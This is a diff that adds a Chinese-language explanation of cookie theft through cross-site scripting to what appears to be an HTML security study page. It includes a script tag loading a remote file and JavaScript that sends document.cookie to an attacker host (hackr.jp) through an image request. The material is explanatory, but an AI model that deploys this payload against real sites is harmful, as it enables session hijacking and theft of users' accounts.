@@ -95,6 +95,16 @@
             &lt;span s="" /&gt;
           &lt;/div&gt;
         </pre>
+        <p>对用户Cookie的窃取攻击:除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie 信息。</p>
+        <pre>&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</pre>
+        <p>该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用JavaScript 编写的代码。</p>
+        <pre>
+          var content = escape(document.cookie);
+          document.write("<img src=http://hackr.jp/?");
+          document.write(content);
+          document.write(">");
+        </pre>
+        <p>在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。</p>
         
 <h3>标签</h3>
 <p>security</p>
